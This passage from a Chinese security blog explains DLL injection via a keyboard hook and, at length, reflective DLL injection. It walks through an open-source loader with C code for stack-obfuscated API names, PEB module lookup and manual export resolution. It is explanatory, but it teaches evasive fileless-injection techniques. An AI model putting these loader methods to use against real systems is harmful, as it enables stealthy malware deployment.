DEF_HOOKSTART);</span><br><span class="line">HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//开始钩取</span></span><br><span class="line">HookStart();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//直至用户输入“q”退出钩取</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]等待输入 &#x27;q&#x27; 来停止钩取...\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>( _getch() != <span class="string">&#x27;q&#x27;</span> );</span><br><span class="line"> </span><br><span class="line"><span class="comment">//终止钩取</span></span><br><span class="line">HookStop();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//卸载KeyHook.dll</span></span><br><span class="line">FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装好键盘钩子后，无论在哪个进程中，只要发生了键盘输入事件，OS就会强制将<strong>KeyHook.dll</strong>注入到进程中，加载了KeyHook.dll的进程，发生键盘事件时会首先调用执行**KeyHook.KetyboardProc()**。</p><p>KetyboardProc()函数中发生键盘输入事件时，会比较当前进程的名称与“notepad.exe”是否相同，相同返回1，终止KetyboardProc()函数，意味着截获并删除了消息，这样键盘消息就不会传递到notepad.exe程序的消息队列。</p><h1 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h1><p>其他注入方式<a href="https://blog.csdn.net/fuhanghang/article/details/83795769">多种DLL注入技术原理介绍_dll注入器-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p><p><a href="https://www.freebuf.com/articles/endpoint/422011.html">反射DLL注入技术深度解析与实战 - FreeBuf网络安全行业门户</a></p><p><a href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p><p>普通DLL注入通过操作目标进程内存空间，强制加载外部DLL文件。核心流程如下：</p><ol><li><strong>获取目标进程句柄</strong>：<code>OpenProcess</code></li><li><strong>分配内存写入DLL路径</strong>：<code>VirtualAllocEx</code>+ <code>WriteProcessMemory</code></li><li><strong>创建远程线程执行加载</strong>：<code>CreateRemoteThread</code>调用<code>LoadLibrary</code></li><li><strong>清理资源</strong>：释放内存并关闭句柄</li></ol><p><strong>技术局限</strong>：</p><ul><li>依赖<code>LoadLibrary</code>等敏感API</li><li>需要磁盘DLL文件落地</li><li>容易被行为分析检测</li></ul><p>普通 DLL 注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程调用 LoadLibrary</span><br></pre></td></tr></table></figure><p>反射 DLL 注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程执行自定义 PE 加载器</span><br></pre></td></tr></table></figure><blockquote><p>PE Loader当双击一个 exe 时真正发生的是,ntdll.dll 里的 Loader</p><p>具体函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LdrLoadDll</span><br><span class="line">LdrpLoadDll</span><br></pre></td></tr></table></figure><p>这套机制统称为：PE Loader</p></blockquote><p>当系统加载一个 DLL 时，Loader 会做下面这些事：</p><p>① 分配内存</p><p>根据 PE 头里的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SizeOfImage</span><br><span class="line">ImageBase</span><br></pre></td></tr></table></figure><p>在内存中分配一块空间。</p><p>② 复制节区（Sections）</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.data</span><br><span class="line">.rdata</span><br></pre></td></tr></table></figure><p>把文件里的节区拷贝到内存中对应位置。</p><p>③ 处理重定位（Relocation）</p><p>如果 DLL 没加载到默认 ImageBase：就根据重定位表修正地址</p><p>④ 修复导入表（IAT）</p><p>如果你的 DLL 里有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBox()</span><br><span class="line">CreateFile()</span><br></pre></td></tr></table></figure><p>它会：找到 user32.dll kernel32.dll获取函数地址填入 IAT</p><p>⑤ 调用入口点</p><p>对于 DLL：DllMain(DLL_PROCESS_ATTACH)</p><p>对于 EXE：EntryPoint()</p><p><strong>反射DLL注入原理</strong></p><p>copy from <a href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p><p>通过 DLL 内部的一个函数来自己把自己加载起来，这么说可能会有一点抽象，总之这个函数会负责解析DLL文件的头信息、导入函数的地址、处理重定位等初始化操作，先不用理解这个函数是怎么实现的，后面会细说，我们只需要将这个DLL文件写入目标进程的虚拟空间中，然后通过DLL的导出表找到这个ReflectiveLoader并调用它，我们的任务就完成了。</p><p>那么我们的任务就到了如何编写这个函数上面了，由于这个函数执行的时候 DLL 还没有被加载，这个函数的编写也会受到诸多限制，比如说无法正常使用全局变量，还有我们的函数必须编写成与地址无关的函数，就像 shellcode 那样，无论加载到了内存中的哪一个位置都要保证成功加载。</p><p>这个技术也是非常实用的，除了进行注入，我们在开发 c2 时也可以利用此技术实现无文件落地攻击。要理解这个技术需要丰富的 PE 知识</p><p>接下来要分析的项目是<a href="https://github.com/oldboy21/RflDllOb%EF%BC%8C%E5%AE%83%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BC%AA">https://github.com/oldboy21/RflDllOb，它实现了一个伪</a> c2 的无文件落地攻击，项目分成两个部分，一个是ReflectiveDLL，就是我们上面说的 dll，还有一个就是ReflectiveDLLInjector，它实现了从 url 下载ReflectiveDLL 并且注入到指定线程中，实现无文件落地攻击的技术。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215704375.png" alt="image-20260217215704375"></p><h2 id="ReflectiveDLL"><a href="#ReflectiveDLL" class="headerlink" title="ReflectiveDLL"></a>ReflectiveDLL</h2><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215852389.png" alt="image-20260217215852389"></p><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><p>反射DLL被当成一段裸内存写进目标进程,然后直接跳转到 ReflectiveLoader,在未知基址执行</p><p>也就是说：代码必须能在“任意地址”运行</p><p>这叫：Position Independent Code（位置无关代码）</p><p>写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char kernel32[] = &quot;kernel32.dll&quot;;</span><br></pre></td></tr></table></figure><p>编译器会把这个字符串放到 <code>.rdata</code> 或 <code>.data</code> 段,代码里使用的是绝对地址引用</p><blockquote><p>PE 文件里的绝对地址通常是：<strong>ImageBase + 偏移量</strong></p><p>如果 ImageBase 变了，那就必须重定位。</p><p>重定位，系统会：</p><ol><li>读取重定位表</li><li>找到所有“需要修正的地址”</li><li>把原地址 + (新基址 - 旧基址)算出来</li></ol><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新基址 = 0x20000000</span><br><span class="line">旧基址 = 0x10000000</span><br><span class="line">差值   = 0x10000000</span><br></pre></td></tr></table></figure></blockquote><p>在编译时编译器不知道你未来会加载到哪里，都会按ImageBase + 偏移来生成机器码。</p><p>正常 LoadLibrary 加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">系统 Loader：</span><br><span class="line">1️⃣ 分配目标内存（SizeOfImage）</span><br><span class="line">2️⃣ 拷贝节区</span><br><span class="line">3️⃣ 处理重定位</span><br><span class="line">4️⃣ 修复 IAT</span><br><span class="line">5️⃣ 调用 DllMain</span><br></pre></td></tr></table></figure><p>注意：重定位发生在代码执行之前</p><p>反射 DLL 的加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1️⃣ 把整个 DLL 文件当作“数据”</span><br><span class="line">    写入目标进程某块内存</span><br><span class="line"></span><br><span class="line">2️⃣ 直接跳转到 ReflectiveLoader（还在原始文件布局里）</span><br><span class="line"></span><br><span class="line">3️⃣ 由 ReflectiveLoader：</span><br><span class="line">    - 解析 PE 头</span><br><span class="line">    - 分配新内存</span><br><span class="line">    - 拷贝节区</span><br><span class="line">    - 处理重定位</span><br><span class="line">    - 修复 IAT</span><br><span class="line">    - 再跳到真正入口点</span><br></pre></td></tr></table></figure><p>类似shellcode</p><p>反射 DLL 不依赖系统 Loader,而系统 Loader 本来负责,现在不用 LoadLibrary 了,只能自己处理</p><p>首先我们在ReflectiveFunction 函数开头可以看到下面这样的声明，还记得我们在上面说的无法使用全局变量吗，这意味着我们所有的变量都必须是堆栈变量(全局变量会产生绝对地址，执行会出问题)。堆栈变量不会最终出现在编译的代码部分（需要重新定位的位置），但始终使用堆栈指针的相对偏移量进行寻址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WCHAR kernel32[] = &#123; L&#x27;K&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;n&#x27;, L&#x27;e&#x27;, L&#x27;l&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR ntdll[] = &#123; L&#x27;n&#x27;, L&#x27;t&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR user32[] = &#123; L&#x27;U&#x27;, L&#x27;s&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualAlloc[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;c&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualProtect[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;P&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR rtladdFunctionTable[] = &#123; &#x27;R&#x27;, &#x27;t&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;d&#x27;, &#x27;d&#x27;, &#x27;F&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;T&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR ntFlushInstructionCache[] = &#123; &#x27;N&#x27;, &#x27;t&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;u&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;I&#x27;, &#x27;n&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;C&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; &#x27;L&#x27;, &#x27;o&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;L&#x27;, &#x27;i&#x27;, &#x27;b&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;y&#x27;, &#x27;A&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure><p>像上面这样声明我们的字符串将使编译器在运行时将这些单个字符推送到堆栈上。因此，区别在于初始化风格，定义单个字符与使用字符串文本，前者产生堆栈分配的数组，而后者产生在可执行文件的初始化数据部分中分配的数组。</p><h3 id="获取所需系统-api"><a href="#获取所需系统-api" class="headerlink" title="获取所需系统 api"></a>获取所需系统 api</h3><p>反射&#x2F;手动映射早期阶段经常处于这种状态：</p><ul><li>IAT（导入表）可能还没修好（或者不想依赖它）</li><li>也不想显式调用 <code>GetProcAddress/LoadLibrary</code>（因为你自己要“当 loader”）</li><li>但又必须拿到一些基础 API（VirtualAlloc&#x2F;VirtualProtect&#x2F;LoadLibrary&#x2F;NtFlushInstructionCache…）才能继续往下做</li></ul><p>所以就需要一条自举路径</p><blockquote><p>从当前进程已加载模块列表里找到 kernel32&#x2F;ntdll,再手工解析它们的 PE 导出表，找到函数地址,遇到导出转发时再递归解析</p></blockquote><p>通过GPAR(GMHR(kernel32), virtualAlloc)这样的方式来获取系统 api，GMHR 是获取 dll 句柄的函数，GPAR 的功能是通过句柄获取对应导出表函数地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ((VA = (fnVirtualAlloc)GPAR(GMHR(kernel32), virtualAlloc)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(VP = (fnVirtualProtect)GPAR(GMHR(kernel32), virtualProtect)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(RAFT = (fnRtlAddFunctionTable)GPAR(GMHR(kernel32), rtladdFunctionTable)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(FIC = (fnNtFlushInstructionCache)GPAR(GMHR(ntdll), ntFlushInstructionCache)))</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure><p>在 GMHR 函数中，我们通过 PEB 来获取想要获取的函数所在 dll 的句柄。（关于 peb 的知识可以看<a href="https://xz.aliyun.com/t/13556%EF%BC%89">https://xz.aliyun.com/t/13556）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//----------------GET MODULE HANDLE---------------------</span><br><span class="line">HMODULE GMHR(IN WCHAR szModuleName[]) &#123;   </span><br><span class="line">    PPEBC                   pPeb = (PEBC*)(__readgsqword(0x60));</span><br><span class="line">    // geting Ldr</span><br><span class="line">    PPEBC_LDR_DATA          pLdr = (PPEBC_LDR_DATA)(pPeb-&gt;Ldr);</span><br><span class="line">    // getting the first element in the linked list (contains information about the first module)</span><br><span class="line">    PLDR_DATA_TABLE_ENTRYC  pDte = (PLDR_DATA_TABLE_ENTRYC)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line"></span><br><span class="line">    while (pDte) &#123;</span><br><span class="line">        // if not null</span><br><span class="line">        if (pDte-&gt;FullDllName.Length != NULL) &#123;</span><br><span class="line"></span><br><span class="line">            // check if both equal</span><br><span class="line">            ToLowerCaseWIDE(pDte-&gt;FullDllName.Buffer);</span><br><span class="line">            ToLowerCaseWIDE(szModuleName);</span><br><span class="line">            if (CompareStringWIDE(pDte-&gt;FullDllName.Buffer, szModuleName)) &#123;</span><br><span class="line"></span><br><span class="line">                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        // next element in the linked list</span><br><span class="line">        pDte = *(PLDR_DATA_TABLE_ENTRYC*)(pDte);</span><br><span class="line">    &#125;  </span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面获取的句柄是指向内存中模块开头的指针，因此我们可以解析 dll 的 PE 标头，获取函数导出表，并且依次进行比较，并且我们的代码考虑了函数转发的情况，函数转发指的是一个 DLL 可以将其导出的函数指向另一个 DLL 的函数，通过转发，系统可以避免重复实现相同的功能。</p><p>GMHR：通过 PEB 找到某个 DLL 的模块基址（HMODULE）</p><p>这段 GMHR 在做的事情：</p><ol><li>通过 GS 寄存器读出 PEB 指针</li><li>从 <code>PEB-&gt;Ldr</code> 拿到 Loader 数据结构</li><li>遍历 <code>InMemoryOrderModuleList</code> 链表</li><li>比较每个模块的 <code>FullDllName</code> &#x2F; <code>BaseDllName</code>，找到名字匹配的模块</li><li>返回该模块的句柄（本质上就是<strong>模块在内存中的基址</strong>）</li></ol><p>关键点解释：</p><ul><li><strong>PEB（Process Environment Block）</strong>：进程里一个很重要的结构，里面有 loader 维护的已加载模块链表。</li><li><code>Ldr-&gt;InMemoryOrderModuleList</code>：链表节点指向每个已加载模块的信息结构（常见是 <code>LDR_DATA_TABLE_ENTRY</code>）。</li><li>HMODULE 是模块句柄：在 Windows 里，<strong>HMODULE 通常就是模块映像基址</strong>，也就是 DLL 映射到内存的起始地址。</li></ul><blockquote><p>Windows 的函数不是散落的，每个API都属于某个模块（DLL）。</p><table><thead><tr><th>API</th><th>所在 DLL</th></tr></thead><tbody><tr><td>VirtualAlloc</td><td>kernel32.dll</td></tr><tr><td>VirtualProtect</td><td>kernel32.dll</td></tr><tr><td>LoadLibraryA</td><td>kernel32.dll</td></tr><tr><td>NtFlushInstructionCache</td><td>ntdll.dll</td></tr><tr><td>MessageBoxA</td><td>user32.dll</td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------获取函数地址-------------------*/</span></span><br><span class="line"></span><br><span class="line">FARPROC <span class="title function_">GPAR</span><span class="params">(IN HMODULE hModule, IN CHAR lpApiName[])</span> &#123;</span><br><span class="line">    <span class="comment">// 获取模块的基地址</span></span><br><span class="line">    PBYTE pBase = (PBYTE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">    <span class="comment">// 检查DOS头的魔数是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 检查NT头的签名是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取可选头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">// 获取导出目录表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取函数名数组、函数地址数组和函数序号数组</span></span><br><span class="line">    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);</span><br><span class="line">    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于处理转发的变量</span></span><br><span class="line">    WCHAR kernel32[] = &#123; <span class="string">L&#x27;K&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;r&#x27;</span>, <span class="string">L&#x27;n&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;3&#x27;</span>, <span class="string">L&#x27;2&#x27;</span>, <span class="string">L&#x27;.&#x27;</span>, <span class="string">L&#x27;d&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    fnLoadLibraryA LLA = <span class="literal">NULL</span>;</span><br><span class="line">    PBYTE functionAddress = <span class="literal">NULL</span>;</span><br><span class="line">    CHAR forwarder[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR dll[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR function[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有导出的函数</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取函数名</span></span><br><span class="line">        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找指定的函数名</span></span><br><span class="line">        <span class="keyword">if</span> (ComprareStringASCII(lpApiName, pFunctionName)) &#123;</span><br><span class="line">            <span class="comment">// 获取函数地址</span></span><br><span class="line">            functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查函数是否是转发</span></span><br><span class="line">            <span class="keyword">if</span> (functionAddress &gt;= (PBYTE)pImgExportDir &amp;&amp; functionAddress &lt; (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) &#123;    </span><br><span class="line">                <span class="comment">// 处理转发字符串</span></span><br><span class="line">                ParseForwarder((CHAR*)functionAddress, dll, function);</span><br><span class="line">                <span class="keyword">if</span> ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == <span class="literal">NULL</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">if</span> (function[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定序号的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPARO(LLA(dll), custom_stoi(function));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定函数名的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPAR(LLA(dll), function);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 返回非转发函数的地址</span></span><br><span class="line">                <span class="keyword">return</span> (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好的，到现在位置我们就可以获取到我们所需要的系统 api 了</p><h3 id="申请-dll-所需要的内存空间"><a href="#申请-dll-所需要的内存空间" class="headerlink" title="申请 dll 所需要的内存空间"></a>申请 dll 所需要的内存空间</h3><p>虽然我们的 dll pe 已经在内存里面了，但是我们还需要更大的一个内存空间对其加载，完成映射节，解析导入表，重定位表等等操作，因此我们需要一片更大的内存空间，我们直接在上面获取系统 api 的步骤中获取 VirtualAlloc 即可，而所需要的内存空间大小是 pe 文件格式里面 IMAGE_OPTIONAL_HEADER 的SizeOfImage 确定</p><blockquote><p> dll pe：这个 DLL 文件的 PE 格式结构数据（原始文件内容）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((pebase = (PBYTE)VA(NULL, pImgOptHdr-&gt;SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure><h3 id="复制节"><a href="#复制节" class="headerlink" title="复制节"></a>复制节</h3><p>我们接下来要把节映射过去，由于节在内存中应该是虚拟地址，所以我们不能一股脑复制过去，要借助IMAGE_SECTION_HEADER 里面的VirtualAddress 字段帮助我们复制</p><p>为什么不能一股脑复制整个 DLL？</p><p>因为现在手里 <code>dllBaseAddress</code> 指向的是 <strong>原始 PE 文件字节（文件布局）</strong>，文件布局的特点是：</p><ul><li>节区在文件里按 <code>PointerToRawData</code> 排列（文件偏移）</li><li>节区大小按 <code>SizeOfRawData</code>（文件对齐 FileAlignment）</li><li>节区位置和间隔不等同于运行时的虚拟地址布局</li></ul><p>而运行时真正执行时，CPU&#x2F;代码访问的是：</p><ul><li><strong>RVA（VirtualAddress）</strong> 为基准的布局（内存对齐 SectionAlignment）</li><li>例如 <code>.text</code> 通常从 RVA 0x1000 开始，而不是文件偏移 0x400</li></ul><p>所以必须按节映射，把：文件偏移 → 拷到 → 内存虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 